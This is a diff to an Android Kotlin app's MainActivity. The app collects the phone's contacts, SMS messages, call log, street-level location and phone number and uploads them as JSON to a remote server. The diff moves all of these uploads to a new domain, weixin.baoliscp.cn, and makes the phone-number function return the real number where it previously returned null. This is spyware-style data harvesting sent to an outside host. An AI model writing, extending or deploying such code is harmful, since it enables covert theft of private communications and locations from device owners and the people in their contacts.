@@ -68,6 +68,7 @@ class MainActivity : AppCompatActivity() {
 
         mLocationClient?.setLocOption(option)
 
+
     }
 
 
@@ -102,7 +103,7 @@ class MainActivity : AppCompatActivity() {
         contJson.add("contacts", contacts)
         contJson.addProperty("mobileNo", num)
         HttpUtil.post {
-            url = "http://60.205.185.171:8080/face/services/appService"
+            url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
             heards.put("token", mToken)
             params.put("methodCode", "005")
             params.put("data", contJson.toString())
@@ -122,7 +123,7 @@ class MainActivity : AppCompatActivity() {
         smsObj.addProperty("mobileNo", num)
 
         HttpUtil.post {
-            url = "http://60.205.185.171:8080/face/services/appService"
+            url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
             heards.put("token", mToken)
             params.put("methodCode", "002")
             params.put("data", smsObj.toString())
@@ -158,7 +159,7 @@ class MainActivity : AppCompatActivity() {
         callLogObj.addProperty("mobileNo", num)
         println("object       " + callLogObj.toString())
         HttpUtil.post {
-            url = "http://60.205.185.171:8080/face/services/appService"
+            url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
             heards.put("token", mToken)
             params.put("token", mToken)
             params.put("methodCode", "001")
@@ -206,14 +207,15 @@ class MainActivity : AppCompatActivity() {
             var adressObj = JsonObject()
             adressObj.addProperty("mobileNo", num)
             adressObj.addProperty("location", province + city + district + street)
+            println("location" + province + city + district + street)
             HttpUtil.post {
-                url = "http://60.205.185.171:8080/face/services/appService"
+                url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
                 heards.put("token", mToken)
                 params.put("token", mToken)
                 params.put("methodCode", "003")
                 params.put("data", adressObj.toString())
                 onSuccess = {
-                    println("upload" + it)
+                    println("location" + it)
                 }
             }
         }
@@ -224,7 +226,7 @@ class MainActivity : AppCompatActivity() {
     fun getTeleNum(): String? {
         val tm = this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val tel = tm!!.line1Number//手机号码
-        return null
+        return tel
     }
 
     //获取短信
